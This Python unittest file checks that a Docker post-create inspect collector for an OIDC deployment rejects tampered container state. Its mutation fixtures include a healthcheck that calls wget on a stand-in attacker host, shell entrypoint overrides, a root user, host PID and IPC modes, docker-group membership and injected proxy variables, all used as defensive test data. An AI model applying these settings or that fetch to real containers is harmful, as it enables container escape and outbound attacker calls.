"""Offline runner and mutation tests for the real-OIDC post-create collector."""

from __future__ import annotations

import copy
import hashlib
import io
import json
import os
from pathlib import Path
import stat
import subprocess
import sys
import tempfile
import unittest
from unittest import mock


ROOT = Path(__file__).resolve().parents[2]


def _module(name: str, relative: str):
    import importlib.util

    path = ROOT / relative
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    value = importlib.util.module_from_spec(spec)
    sys.modules[name] = value
    spec.loader.exec_module(value)
    return value


collector = _module(
    "test_real_oidc_post_create_collector",
    "scripts/collect_private_server_real_oidc_post_create.py",
)
from tests.deployment import test_private_server_real_oidc_activation_plan as activation_fixture


activate = activation_fixture.activate
preflight = activation_fixture.preflight
PROJECT = activation_fixture.PROJECT


def _canonical(value) -> bytes:
    return (
        json.dumps(value, ensure_ascii=True, sort_keys=True, separators=(",", ":"))
        + "\n"
    ).encode("ascii")


class _ObservationFixture:
    def __init__(self, snapshot, create_plan_raw: bytes) -> None:
        self.snapshot = snapshot
        self.create_plan = json.loads(create_plan_raw)
        self.contract = preflight._post_create_compose_contract(snapshot)
        self.container_ids = {
            service: hashlib.sha256(("collector-container:" + service).encode()).hexdigest()
            for service in preflight._SERVICES
        }
        self.network_ids = {
            logical: hashlib.sha256(("collector-network:" + logical).encode()).hexdigest()
            for logical in preflight.fresh_resource_names(PROJECT)
        }
        self.volume_mountpoint = "/var/lib/docker/volumes/collector/_data"
        self.images = {
            reference: self._image(reference, identifier)
            for reference, identifier in self.create_plan["image_ids"].items()
        }
        self.containers = {
            service: self._container(service) for service in preflight._SERVICES
        }
        self.networks = {
            logical: self._network(logical)
            for logical in preflight.fresh_resource_names(PROJECT)
        }
        self.volume = {
            "Name": self.contract["volume_name"],
            "Driver": "local",
            "Scope": "local",
            "Mountpoint": self.volume_mountpoint,
            "Labels": {
                "com.docker.compose.project": PROJECT,
                "com.docker.compose.volume": "postgres-data",
            },
            "Options": {},
        }

    def clone(self):
        value = copy.copy(self)
        value.container_ids = dict(self.container_ids)
        value.network_ids = dict(self.network_ids)
        value.containers = copy.deepcopy(self.containers)
        value.networks = copy.deepcopy(self.networks)
        value.volume = copy.deepcopy(self.volume)
        value.images = copy.deepcopy(self.images)
        return value

    def _image(self, reference: str, identifier: str) -> dict:
        if reference.startswith("postgres:"):
            config = {
                "Cmd": ["postgres"],
                "Entrypoint": ["docker-entrypoint.sh"],
                "User": "",
                "WorkingDir": "",
                "StopSignal": "SIGINT",
                "ExposedPorts": {"5432/tcp": {}},
                "Volumes": {"/var/lib/postgresql": {}},
                "Env": [
                    "PATH=/collector/postgres/bin",
                    "PGDATA=/collector/image-pgdata",
                ],
            }
        elif "oidc-egress-guard" in reference:
            config = {
                "Cmd": None,
                "Entrypoint": [
                    "/usr/local/bin/desire-real-oidc-egress-guard"
                ],
                "User": "0:0",
                "WorkingDir": "",
                "ExposedPorts": None,
                "Volumes": None,
                "Env": ["PATH=/collector/guard/bin"],
            }
        elif "-web:" in reference:
            config = {
                "Cmd": [
                    "./node_modules/.bin/vinext",
                    "start",
                    "--hostname",
                    "0.0.0.0",
                    "--port",
                    "3000",
                ],
                "Entrypoint": None,
                "User": "node",
                "WorkingDir": "/app/web",
                "ExposedPorts": {"3000/tcp": {}},
                "Volumes": None,
                "Env": [
                    "PATH=/collector/web/bin",
                    "NODE_ENV=collector-image-default",
                ],
            }
        elif "-edge:" in reference:
            config = {
                "Cmd": [
                    "/usr/bin/caddy",
                    "run",
                    "--config",
                    "/etc/caddy/Caddyfile",
                    "--adapter",
                    "caddyfile",
                ],
                "Entrypoint": None,
                "User": "10001:10001",
                "WorkingDir": "/srv",
                "ExposedPorts": {"443/tcp": {}, "8080/tcp": {}},
                "Volumes": None,
                "Env": [
                    "PATH=/collector/edge/bin",
                    "XDG_CONFIG_HOME=/collector/private-config",
                ],
            }
        else:
            config = {
                "Cmd": [
                    "python",
                    "-m",
                    "desire_platform.internal_pilot.api_server",
                ],
                "Entrypoint": None,
                "User": "10001:10001",
                "WorkingDir": "/opt/desire",
                "ExposedPorts": {"8000/tcp": {}},
                "Volumes": None,
                "Env": [
                    "PATH=/collector/platform/bin",
                    "PYTHONUNBUFFERED=collector-image-private-value",
                ],
            }
        config["Labels"] = (
            {}
            if "-edge:" in reference
            else {
                "org.opencontainers.image.vendor": (
                    "collector-fixture-private-label"
                )
            }
        )
        return {"Id": identifier, "Config": config}

    def _container(self, service: str) -> dict:
        expected = self.contract["services"][service]
        image = self.images[expected["image_reference"]]["Config"]
        command = (
            expected["command_override"]
            if expected["command_override"] is not None
            else image["Cmd"]
        )
        entrypoint = (
            expected["entrypoint_override"]
            if expected["entrypoint_override"] is not None
            else image["Entrypoint"]
        )
        user = (
            expected["user_override"]
            if expected["user_override"] is not None
            else image["User"]
        )
        network_mode = expected["network_mode"]
        if service == "api":
            network_mode = network_mode.format(
                guard_container_id=self.container_ids["oidc-egress-guard"]
            )
        mounts = []
        host_config_mounts = []
        host_config_binds = None
        for value in expected["mounts"]:
            if value["type"] == "bind":
                mounts.append(
                    {
                        "Type": "bind",
                        "Source": value["raw_source"],
                        "Destination": value["destination"],
                        "Mode": "",
                        "RW": not value["read_only"],
                        "Propagation": "rprivate",
                    }
                )
                host_config_mount = {
                    "Type": "bind",
                    "Source": value["raw_source"],
                    "Target": value["destination"],
                    "ReadOnly": True,
                }
                if value["host_config_bind_options_present"]:
                    host_config_mount["BindOptions"] = {}
                host_config_mounts.append(host_config_mount)
            else:
                mounts.append(
                    {
                        "Type": "volume",
                        "Name": value["raw_source"],
                        "Source": self.volume_mountpoint,
                        "Destination": value["destination"],
                        "Driver": "local",
                        "Mode": "rw",
                        "RW": not value["read_only"],
                        "Propagation": "",
                    }
                )
                host_config_binds = [
                    f"{value['raw_source']}:{value['destination']}:rw"
                ]
        endpoints = {}
        for logical, value in expected["desired_network_config"].items():
            endpoints[value["network_name"]] = {
                "NetworkID": "",
                "Aliases": list(reversed(value["aliases"])),
                "IPAMConfig": (
                    {
                        "IPv4Address": value["requested_ipv4"] or "",
                        "IPv6Address": "",
                    }
                    if value["ipam_config_present"]
                    else None
                ),
            }
        port_bindings = {}
        for item in expected["ports"]:
            key = f"{item['container_port']}/{item['protocol']}"
            port_bindings.setdefault(key, []).append(
                {"HostIp": item["host_ip"], "HostPort": item["host_port"]}
            )
        exposed_ports = dict(image.get("ExposedPorts") or {})
        for key in port_bindings:
            exposed_ports[key] = {}
        environment_map = {
            value.split("=", 1)[0]: value.split("=", 1)[1]
            for value in image["Env"]
        }
        environment_map.update(expected["environment"])
        environment = [
            key + "=" + value
            for key, value in reversed(tuple(environment_map.items()))
        ]
        dependencies = ",".join(
            f"{item['service']}:{item['condition']}:{str(item['restart']).lower()}"
            for item in expected["depends_on"]
        )
        labels = dict(image["Labels"])
        labels.update(
            {
                "com.docker.compose.config-hash": hashlib.sha256(
                    ("config:" + service).encode()
                ).hexdigest(),
                "com.docker.compose.project": PROJECT,
                "com.docker.compose.service": service,
                "com.docker.compose.oneoff": "False",
                "com.docker.compose.container-number": "1",
                "com.docker.compose.image": self.create_plan["image_ids"][
                    expected["image_reference"]
                ],
                "com.docker.compose.project.config_files": str(
                    self.snapshot.attempt_root / "resolved.compose.json"
                ),
                "com.docker.compose.project.working_dir": str(
                    self.snapshot.attempt_root
                ),
                "com.docker.compose.version": preflight._COMPOSE_VERSION,
                "com.docker.compose.depends_on": dependencies,
            }
        )
        container_config = {
            "Image": expected["image_reference"],
            "Labels": labels,
            "Env": environment,
            "Cmd": command,
            "Entrypoint": entrypoint,
            "User": user,
            "WorkingDir": image.get("WorkingDir", ""),
            "ExposedPorts": exposed_ports or None,
            "Volumes": copy.deepcopy(image.get("Volumes")),
        }
        if expected["healthcheck_override"] is not None:
            container_config["Healthcheck"] = {
                key: copy.deepcopy(value)
                for key, value in expected["healthcheck_override"].items()
                if value
            }
        if expected["stop_timeout_seconds"] is not None:
            container_config["StopTimeout"] = expected["stop_timeout_seconds"]
        if "StopSignal" in image:
            container_config["StopSignal"] = image["StopSignal"]
        host_config = {
            "NetworkMode": network_mode,
            "Privileged": False,
            "AutoRemove": False,
            "PublishAllPorts": False,
            "ReadonlyRootfs": expected["read_only_rootfs"],
            "Devices": [],
            "DeviceRequests": None,
            "GroupAdd": None,
            "PidMode": "",
            "IpcMode": "private",
            "UTSMode": "",
            "UsernsMode": "",
            "CapAdd": expected["cap_add"] or None,
            "CapDrop": expected["cap_drop"] or None,
            "SecurityOpt": (
                [
                    "no-new-privileges:true"
                    if value == "no-new-privileges=true"
                    else value
                    for value in expected["security_opt"]
                ]
                or None
            ),
            "RestartPolicy": {
                "Name": expected["restart"],
                "MaximumRetryCount": 0,
            },
            "Sysctls": expected["sysctls"] or None,
            "Init": expected["init"],
            "Tmpfs": {
                item["destination"]: item["options"] for item in expected["tmpfs"]
            },
            "PortBindings": port_bindings or None,
            "ExtraHosts": expected["api_extra_hosts"] if service == "api" else None,
            "Binds": host_config_binds,
        }
        if host_config_mounts:
            host_config["Mounts"] = host_config_mounts
        return {
            "Id": self.container_ids[service],
            "Name": "/" + expected["name"],
            "Image": self.create_plan["image_ids"][expected["image_reference"]],
            "Config": container_config,
            "State": {
                "Status": "created",
                "Running": False,
                "Paused": False,
                "Restarting": False,
                "OOMKilled": False,
                "Dead": False,
                "Pid": 0,
                "ExitCode": 0,
                "Error": "",
                "StartedAt": "0001-01-01T00:00:00Z",
                "FinishedAt": "0001-01-01T00:00:00Z",
            },
            "RestartCount": 0,
            "HostConfig": host_config,
            "Mounts": mounts,
            "NetworkSettings": {"Networks": endpoints, "Ports": {}},
        }

    def _network(self, logical: str) -> dict:
        expected = self.contract["networks"][logical]
        return {
            "Id": self.network_ids[logical],
            "Name": expected["name"],
            "Driver": "bridge",
            "Scope": "local",
            "Internal": expected["internal"],
            "EnableIPv6": False,
            "IPAM": {"Config": [{"Subnet": expected["subnet"]}]},
            "Labels": {
                "com.docker.compose.project": PROJECT,
                "com.docker.compose.network": logical,
            },
            "Containers": {},
        }

    def outputs(self) -> list[bytes]:
        container_rows = b"".join(
            _canonical({"Id": self.container_ids[service], "Name": PROJECT + "-" + service + "-1"})
            for service in preflight._SERVICES
        )
        network_rows = b"".join(
            _canonical({"Id": self.network_ids[logical], "Name": self.contract["networks"][logical]["name"]})
            for logical in preflight.fresh_resource_names(PROJECT)
        )
        volume_rows = _canonical({"Name": self.contract["volume_name"]})
        values = [container_rows, network_rows, volume_rows]
        values.extend(_canonical(self.containers[service]) for service in preflight._SERVICES)
        values.extend(
            _canonical(self.networks[logical])
            for logical in preflight.fresh_resource_names(PROJECT)
        )
        values.append(_canonical(self.volume))
        values.extend(
            _canonical(self.images[reference]) for reference in self.snapshot.image_references
        )
        values.extend((container_rows, network_rows, volume_rows))
        assert len(values) == len(preflight._SERVICES) + 16
        return values


class _Runner:
    def __init__(self, commands, outputs) -> None:
        self.commands = tuple(commands)
        self.outputs = list(outputs)
        self.calls = []
        self.environments = []

    def __call__(self, command, environment):
        index = len(self.calls)
        if index >= len(self.commands) or tuple(command) != self.commands[index]:
            raise AssertionError("unexpected command")
        self.calls.append(tuple(command))
        self.environments.append(dict(environment))
        return subprocess.CompletedProcess(command, 0, self.outputs[index], b"")


class PrivateServerRealOidcPostCreateCollectorTests(unittest.TestCase):
    def setUp(self) -> None:
        self.temporary = tempfile.TemporaryDirectory(prefix="real-oidc-collector-")
        parent = Path(self.temporary.name).resolve(strict=True)
        parent.chmod(0o700)
        self.fixture = activation_fixture._Fixture(parent)
        self.snapshot = self.fixture.stage()
        evidence_raw = _canonical(self.fixture.evidence(self.snapshot))
        self.create_plan = activate.build_activation_plan(
            attempt_root=self.fixture.attempt,
            authorization_raw=_canonical(
                self.fixture.authorization(self.snapshot, evidence_raw)
            ),
            evidence_raw=evidence_raw,
        )
        self.observation = _ObservationFixture(self.snapshot, self.create_plan.raw)
        self.commands = preflight.post_create_inspect_commands(self.snapshot)

    def tearDown(self) -> None:
        self.fixture.close()
        self.temporary.cleanup()

    def _collect(self, outputs=None):
        runner = _Runner(self.commands, outputs or self.observation.outputs())
        evidence = collector.collect_post_create_evidence(
            attempt_root=self.fixture.attempt,
            create_plan_raw=self.create_plan.raw,
            command_runner=runner,
        )
        return evidence, runner

    def test_plan_is_exact_read_only_and_never_invokes_runner(self) -> None:
        plan = collector.build_collection_plan(
            attempt_root=self.fixture.attempt,
            create_plan_raw=self.create_plan.raw,
        )
        document = json.loads(plan.raw)
        self.assertEqual(plan.commands, self.commands)
        self.assertEqual(len(plan.commands), len(preflight._SERVICES) + 16)
        self.assertEqual(document["authority"], "NOT_AUTHORITY")
        self.assertFalse(document["execution"]["permitted"])
        self.assertFalse(document["collection_contract"]["runner_invoked"])
        forbidden = {"start", "create", "update", "connect", "disconnect", "run", "up", "down", "rm"}
        for command in plan.commands:
            self.assertEqual(command[0], "/usr/bin/docker")
            self.assertFalse(forbidden.intersection(command))
            self.assertNotIn("compose", command)
        self.assertEqual(plan.commands[:3], plan.commands[-3:])

    def test_collection_closes_baseline_and_remains_not_authority(self) -> None:
        evidence, runner = self._collect()
        document = json.loads(evidence.raw)
        self.assertEqual(len(runner.calls), len(preflight._SERVICES) + 16)
        self.assertTrue(
            all(value == dict(collector._CLOSED_ENVIRONMENT) for value in runner.environments)
        )
        self.assertEqual(
            evidence.collection_status,
            "COLLECTED_BASELINE_PROJECTION_VALIDATED_NOT_AUTHORITY",
        )
        self.assertEqual(document["authority"], "NOT_AUTHORITY")
        self.assertFalse(document["collection"]["raw_inspect_persisted"])
        self.assertNotIn(
            "POST_CREATE_LIVE_INSPECT_COLLECTOR_UNIMPLEMENTED",
            evidence.execute_blockers,
        )
        self.assertEqual(
            set(preflight._START_EXECUTE_BLOCKERS)
            - set(evidence.execute_blockers),
            {"POST_CREATE_LIVE_INSPECT_COLLECTOR_UNIMPLEMENTED"},
        )
        self.assertIn(
            "POST_CREATE_SECURITY_PROJECTION_RULE_VALIDATOR_UNIMPLEMENTED",
            evidence.execute_blockers,
        )
        self.assertIn(
            "PRE_START_FULL_REINSPECTION_RUNNER_UNIMPLEMENTED",
            evidence.execute_blockers,
        )
        for blocker in (
            "POST_CREATE_COLLECTOR_PROVENANCE_UNIMPLEMENTED",
            "DOCKER_SOCKET_EXCLUSIVE_BROKER_UNIMPLEMENTED",
            "EXECUTION_AUTHORIZATION_V2_UNIMPLEMENTED",
        ):
            self.assertIn(blocker, evidence.execute_blockers)
            tampered = copy.deepcopy(document)
            tampered["execute_blockers"].remove(blocker)
            with self.assertRaises(
                preflight.PrivateServerRealOidcPreflightError
            ):
                preflight.validate_post_create_evidence(
                    _canonical(tampered),
                    snapshot=self.snapshot,
                    create_plan_sha256=self.create_plan.sha256,
                    image_ids=json.loads(self.create_plan.raw)["image_ids"],
                )
        serialized = evidence.raw.decode("ascii")
        self.assertNotIn("/daemon-private", serialized)
        self.assertNotIn("/var/lib/docker/volumes", serialized)
        self.assertNotIn("GraphDriver", serialized)
        self.assertNotIn(str(self.fixture.attempt / "bundle/runtime-secrets"), serialized)
        self.assertNotIn("DESIRE_REAL_OIDC_DB_DATA_IPV4=", serialized)
        self.assertNotIn(str(self.snapshot.attempt_root), serialized)
        self.assertNotIn("project.config_files", serialized)
        self.assertNotIn("project.working_dir", serialized)
        self.assertNotIn('"Env"', serialized)
        self.assertNotIn("pilot.example.org", serialized)
        self.assertNotIn("collector-image-private-value", serialized)
        self.assertNotIn("/collector/", serialized)
        self.assertNotIn("CMD-SHELL", serialized)
        self.assertNotIn("pg_isready", serialized)
        self.assertNotIn('"Options"', serialized)
        self.assertNotIn("collector-fixture-private-label", serialized)
        self.assertEqual(len(document["containers"]), len(preflight._SERVICES))
        self.assertEqual(len(document["semantic_projection"]["images"]), 5)
        image_runtime = document["semantic_projection"][
            "image_runtime_metadata"
        ]
        self.assertEqual(len(image_runtime), 5)
        for value in image_runtime.values():
            self.assertEqual(
                set(value),
                {
                    "exposed_ports",
                    "exposed_port_count",
                    "volume_target_count",
                    "environment_entry_count",
                    "healthcheck_present",
                    "healthcheck_field_presence",
                },
            )
        edge = document["semantic_projection"]["containers"]["edge"]
        self.assertEqual(
            edge["runtime_metadata"]["effective_exposed_ports"],
            ["443/tcp", "8080/tcp"],
        )
        self.assertTrue(
            edge["runtime_metadata"]["created_port_map_empty"]
        )
        self.assertNotIn("volume_targets", json.dumps(image_runtime))
        self.assertEqual(len(document["networks"]), 4)
        semantic_projection = document["semantic_projection"]
        self.assertTrue(
            all(
                value["containers_empty"] is True
                for value in semantic_projection["networks"].values()
            )
        )
        self.assertEqual(
            semantic_projection["containers"]["api"]["desired_network_config"],
            {},
        )
        self.assertEqual(
            semantic_projection["containers"]["db"]["desired_network_config"][
                "data"
            ]["requested_ipv4"],
            "172.29.25.10",
        )
        self.assertTrue(
            semantic_projection["containers"]["db"]["desired_network_config"][
                "data"
            ]["ipam_config_present"]
        )
        self.assertFalse(
            semantic_projection["containers"]["web"]["desired_network_config"][
                "app"
            ]["ipam_config_present"]
        )
        self.assertTrue(
            all(
                endpoint["ipam_config_present"] is True
                for endpoint in semantic_projection["containers"][
                    "oidc-egress-guard"
                ]["desired_network_config"].values()
            )
        )
        self.assertTrue(
            all(
                endpoint["runtime_network_id_unassigned"] is True
                for service in preflight._SERVICES
                for endpoint in semantic_projection["containers"][service][
                    "desired_network_config"
                ].values()
            )
        )
        db_mount_transport = semantic_projection["containers"]["db"][
            "mount_transport"
        ]
        self.assertEqual(db_mount_transport["host_config_bind_count"], 1)
        self.assertEqual(
            db_mount_transport["named_volume_mountpoint_match_count"], 1
        )
        for service in preflight._SERVICES:
            security = semantic_projection["containers"][service]["security"]
            environment = security["environment"]
            self.assertTrue(environment["exact_map_match"])
            self.assertTrue(environment["proxy_keys_absent"])
            self.assertGreater(environment["compose_entry_count"], 0)
            self.assertGreaterEqual(environment["effective_entry_count"], 1)
            self.assertNotIn("sha256", environment)
            healthcheck = security["healthcheck"]
            self.assertTrue(healthcheck["matches_effective"])
            self.assertTrue(healthcheck["unknown_fields_absent"])
            self.assertNotIn("Test", healthcheck)
            stop_timeout = security["stop_timeout"]
            self.assertTrue(stop_timeout["matches_effective"])
            self.assertEqual(
                stop_timeout["present"],
                service in ("api", "db", "matching-runtime"),
            )
            self.assertEqual(
                stop_timeout["source"],
                (
                    "COMPOSE_EXPLICIT"
                    if service in ("api", "db", "matching-runtime")
                    else "ABSENT"
                ),
            )
            mount_transport = semantic_projection["containers"][service][
                "mount_transport"
            ]
            self.assertTrue(mount_transport["top_mounts_match"])
            self.assertTrue(mount_transport["host_config_mounts_match"])
            self.assertTrue(mount_transport["host_config_binds_match"])
            if service != "db":
                self.assertEqual(
                    mount_transport["named_volume_mountpoint_match_count"], 0
                )
        self.assertNotIn("Mountpoint", serialized)
        self.assertNotIn("BindOptions", serialized)
        for forbidden in (
            "network_endpoints",
            "own_network_endpoint_ids",
            "guard_network_ids",
        ):
            self.assertNotIn(forbidden, serialized)

        authorization_raw = _canonical(
            self.fixture.start_authorization(
                self.snapshot, self.create_plan.raw, evidence.raw
            )
        )
        start_plan = activate.build_start_plan(
            attempt_root=self.fixture.attempt,
            create_plan_raw=self.create_plan.raw,
            post_create_evidence_raw=evidence.raw,
            authorization_raw=authorization_raw,
        )
        start_document = json.loads(start_plan.raw)
        self.assertFalse(start_document["execution"]["permitted"])
        self.assertEqual(
            start_document["post_create_collection_status"],
            "COLLECTED_BASELINE_PROJECTION_VALIDATED_NOT_AUTHORITY",
        )
        self.assertEqual(
            start_document["execution"]["execute_blockers"],
            list(preflight._COLLECTED_START_EXECUTE_BLOCKERS),
        )
        self.assertNotIn(
            "POST_CREATE_LIVE_INSPECT_COLLECTOR_UNIMPLEMENTED",
            start_document["execution"]["execute_blockers"],
        )
        self.assertIn(
            "POST_CREATE_SECURITY_PROJECTION_RULE_VALIDATOR_UNIMPLEMENTED",
            start_document["execution"]["execute_blockers"],
        )
        for blocker in (
            "POST_CREATE_COLLECTOR_PROVENANCE_UNIMPLEMENTED",
            "DOCKER_SOCKET_EXCLUSIVE_BROKER_UNIMPLEMENTED",
            "EXECUTION_AUTHORIZATION_V2_UNIMPLEMENTED",
        ):
            self.assertIn(
                blocker, start_document["execution"]["execute_blockers"]
            )

    def test_process_host_security_and_compose_label_mutations_fail_closed(self) -> None:
        mutations = []

        def changed(service, section, key, value):
            observation = self.observation.clone()
            observation.containers[service][section][key] = value
            mutations.append(observation)

        changed("migrate", "Config", "Cmd", ["sh"])
        changed("web", "Config", "Entrypoint", ["/bin/sh"])
        changed("api", "Config", "User", "0:0")
        changed("web", "HostConfig", "CapAdd", ["NET_ADMIN"])
        changed("oidc-egress-guard", "HostConfig", "CapAdd", None)
        changed("db", "HostConfig", "CapDrop", ["ALL"])
        changed("api", "HostConfig", "CapDrop", None)
        changed("api", "HostConfig", "SecurityOpt", None)
        changed(
            "api",
            "HostConfig",
            "RestartPolicy",
            {"Name": "always", "MaximumRetryCount": 0},
        )
        changed(
            "edge",
            "HostConfig",
            "Sysctls",
            {"net.ipv4.ip_unprivileged_port_start": "1024"},
        )
        changed("edge", "HostConfig", "Init", False)
        changed("web", "HostConfig", "ExtraHosts", ["host:host-gateway"])
        changed("web", "HostConfig", "DeviceRequests", [{"Driver": "nvidia"}])
        changed("web", "HostConfig", "GroupAdd", ["docker"])
        changed("web", "HostConfig", "PidMode", "host")
        changed("web", "HostConfig", "IpcMode", "host")
        changed("web", "HostConfig", "UTSMode", "host")
        changed("web", "HostConfig", "UsernsMode", "private")

        for label, value in (
            ("com.docker.compose.config-hash", "not-a-sha"),
            ("com.docker.compose.image", "sha256:" + "f" * 64),
            ("com.docker.compose.version", "0.0.0"),
            ("com.docker.compose.project.config_files", "/tmp/forged.json"),
            ("com.docker.compose.project.working_dir", "/tmp"),
            ("com.docker.compose.depends_on", "db:service_started:false"),
        ):
            observation = self.observation.clone()
            observation.containers["api"]["Config"]["Labels"][label] = value
            mutations.append(observation)
        observation = self.observation.clone()
        observation.containers["api"]["Config"]["Labels"][
            "com.docker.compose.replace"
        ] = "f" * 64
        mutations.append(observation)
        observation = self.observation.clone()
        observation.containers["api"]["Config"]["Labels"][
            "org.opencontainers.image.vendor"
        ] = "forged"
        mutations.append(observation)
        observation = self.observation.clone()
        api_reference = observation.contract["services"]["api"]["image_reference"]
        observation.images[api_reference]["Config"]["Labels"][
            "com.docker.compose.project"
        ] = PROJECT
        mutations.append(observation)

        for index, observation in enumerate(mutations):
            with self.subTest(index=index):
                with self.assertRaises(
                    collector.PrivateServerRealOidcPostCreateCollectorError
                ):
                    self._collect(observation.outputs())

    def test_image_inherited_process_mismatch_fails_closed_but_valid_hash_stays_blocked(self) -> None:
        observation = self.observation.clone()
        web_reference = observation.contract["services"]["web"]["image_reference"]
        observation.images[web_reference]["Config"]["Cmd"] = ["forged"]
        with self.assertRaises(
            collector.PrivateServerRealOidcPostCreateCollectorError
        ):
            self._collect(observation.outputs())

        # A syntactically valid config-hash cannot be proved authoritative by
        # this inspect-only collector.  It remains non-authority and retains
        # the explicit security/provenance blockers.
        observation = self.observation.clone()
        observation.containers["api"]["Config"]["Labels"][
            "com.docker.compose.config-hash"
        ] = "f" * 64
        evidence, _runner = self._collect(observation.outputs())
        self.assertNotIn(("f" * 64).encode("ascii"), evidence.raw)
        self.assertIn(
            "POST_CREATE_SECURITY_PROJECTION_RULE_VALIDATOR_UNIMPLEMENTED",
            evidence.execute_blockers,
        )
        self.assertIn(
            "POST_CREATE_COLLECTOR_PROVENANCE_UNIMPLEMENTED",
            evidence.execute_blockers,
        )

    def test_image_and_container_runtime_metadata_mutations_fail_closed(self) -> None:
        mutations = []

        value = self.observation.clone()
        platform_reference = value.contract["services"]["api"]["image_reference"]
        value.images[platform_reference]["Config"]["ExposedPorts"][
            "9999/tcp"
        ] = {}
        mutations.append(value)

        value = self.observation.clone()
        edge_reference = value.contract["services"]["edge"]["image_reference"]
        del value.images[edge_reference]["Config"]["ExposedPorts"]["8080/tcp"]
        mutations.append(value)

        value = self.observation.clone()
        db_reference = value.contract["services"]["db"]["image_reference"]
        value.images[db_reference]["Config"]["Volumes"] = {
            "/var/lib/postgresql/data": {}
        }
        mutations.append(value)

        value = self.observation.clone()
        value.images[edge_reference]["Config"]["Volumes"] = {"/data": {}}
        mutations.append(value)

        value = self.observation.clone()
        value.containers["api"]["Config"]["ExposedPorts"] = None
        mutations.append(value)

        value = self.observation.clone()
        value.containers["edge"]["Config"]["ExposedPorts"]["80/tcp"] = {}
        mutations.append(value)

        value = self.observation.clone()
        value.containers["edge"]["HostConfig"]["PortBindings"]["8080/tcp"] = [
            {"HostIp": "127.0.0.1", "HostPort": "8080"}
        ]
        mutations.append(value)

        value = self.observation.clone()
        value.containers["db"]["Config"]["Volumes"] = None
        mutations.append(value)

        value = self.observation.clone()
        value.containers["edge"]["NetworkSettings"]["Ports"] = None
        mutations.append(value)

        value = self.observation.clone()
        value.containers["edge"]["NetworkSettings"]["Ports"] = {
            "443/tcp": None
        }
        mutations.append(value)

        value = self.observation.clone()
        value.containers["edge"]["Config"]["WorkingDir"] = "/tmp"
        mutations.append(value)

        value = self.observation.clone()
        value.containers["db"]["Config"]["StopSignal"] = "SIGTERM"
        mutations.append(value)

        value = self.observation.clone()
        value.containers["db"]["HostConfig"]["Tmpfs"] = {}
        mutations.append(value)

        value = self.observation.clone()
        value.containers["db"]["Mounts"].append(
            {
                "Type": "volume",
                "Name": "anonymous-volume",
                "Source": "/var/lib/docker/volumes/anonymous/_data",
                "Destination": "/var/lib/postgresql",
                "Driver": "local",
                "RW": True,
            }
        )
        mutations.append(value)

        for index, value in enumerate(mutations):
            with self.subTest(index=index):
                with self.assertRaises(
                    collector.PrivateServerRealOidcPostCreateCollectorError
                ):
                    self._collect(value.outputs())

    def test_effective_environment_healthcheck_and_stop_timeout_fail_closed(self) -> None:
        mutations = []

        value = self.observation.clone()
        value.containers["api"]["Config"]["Env"].append(
            value.containers["api"]["Config"]["Env"][0]
        )
        mutations.append(value)
        for malformed in (
            "MISSING_EQUALS",
            "9INVALID=value",
            "INVALID-NAME=value",
            "NUL=value\x00private",
        ):
            value = self.observation.clone()
            value.containers["api"]["Config"]["Env"].append(malformed)
            mutations.append(value)
        for proxy_key in (
            "http_proxy",
            "HTTP_PROXY",
            "HtTp_PrOxY",
            "HTTPS_PROXY",
            "FTP_PROXY",
            "No_Proxy",
            "ALL_PROXY",
        ):
            value = self.observation.clone()
            value.containers["api"]["Config"]["Env"].append(
                proxy_key + "=http://private-proxy.example"
            )
            mutations.append(value)

        value = self.observation.clone()
        value.containers["api"]["Config"]["Env"].append(
            "UNREVIEWED=collector-private-environment-value"
        )
        mutations.append(value)
        value = self.observation.clone()
        value.containers["api"]["Config"]["Env"].pop()
        mutations.append(value)
        value = self.observation.clone()
        key = value.containers["api"]["Config"]["Env"][0].split("=", 1)[0]
        value.containers["api"]["Config"]["Env"][0] = key + "=changed-private-value"
        mutations.append(value)

        value = self.observation.clone()
        api_reference = value.contract["services"]["api"]["image_reference"]
        value.images[api_reference]["Config"]["Env"].append(
            value.images[api_reference]["Config"]["Env"][0]
        )
        mutations.append(value)
        value = self.observation.clone()
        api_reference = value.contract["services"]["api"]["image_reference"]
        value.images[api_reference]["Config"]["Env"].append(
            "hTtPs_PrOxY=http://private-proxy.example"
        )
        mutations.append(value)

        def changed_health(field, changed):
            value = self.observation.clone()
            value.containers["edge"]["Config"]["Healthcheck"][field] = changed
            mutations.append(value)

        changed_health("Test", ["CMD", "wget", "http://attacker.invalid/"])
        changed_health("Interval", 11_000_000_000)
        changed_health("Timeout", 4_000_000_000)
        changed_health("Retries", 11)
        changed_health("StartPeriod", 6_000_000_000)
        changed_health("StartInterval", 1_000_000_000)
        changed_health("Unexpected", 1)
        value = self.observation.clone()
        del value.containers["edge"]["Config"]["Healthcheck"]["Test"]
        mutations.append(value)
        value = self.observation.clone()
        value.containers["edge"]["Config"]["Healthcheck"] = None
        mutations.append(value)
        value = self.observation.clone()
        value.containers["migrate"]["Config"]["Healthcheck"] = None
        mutations.append(value)
        value = self.observation.clone()
        edge_reference = value.contract["services"]["edge"]["image_reference"]
        value.images[edge_reference]["Config"]["Healthcheck"] = {
            "Unexpected": 1
        }
        mutations.append(value)
        value = self.observation.clone()
        edge_reference = value.contract["services"]["edge"]["image_reference"]
        value.images[edge_reference]["Config"]["Healthcheck"] = {
            "StartInterval": 2_000_000_000
        }
        mutations.append(value)

        value = self.observation.clone()
        value.containers["db"]["Config"]["StopTimeout"] = 59
        mutations.append(value)
        value = self.observation.clone()
        del value.containers["api"]["Config"]["StopTimeout"]
        mutations.append(value)
        value = self.observation.clone()
        value.containers["web"]["Config"]["StopTimeout"] = None
        mutations.append(value)
        value = self.observation.clone()
        value.containers["web"]["Config"]["StopTimeout"] = 20
        mutations.append(value)
        value = self.observation.clone()
        value.containers["db"]["Config"]["StopTimeout"] = True
        mutations.append(value)
        value = self.observation.clone()
        db_reference = value.contract["services"]["db"]["image_reference"]
        value.images[db_reference]["Config"]["StopTimeout"] = None
        mutations.append(value)

        for index, value in enumerate(mutations):
            with self.subTest(index=index):
                with self.assertRaises(
                    collector.PrivateServerRealOidcPostCreateCollectorError
                ) as caught:
                    self._collect(value.outputs())
                self.assertEqual(
                    str(caught.exception),
                    "PRIVATE_SERVER_REAL_OIDC_POST_CREATE_COLLECTOR_INVALID",
                )
                self.assertNotIn("private", str(caught.exception))

    def test_environment_order_and_image_healthcheck_field_inheritance_are_exact(self) -> None:
        value = self.observation.clone()
        value.containers["api"]["Config"]["Env"].reverse()
        edge_reference = value.contract["services"]["edge"]["image_reference"]
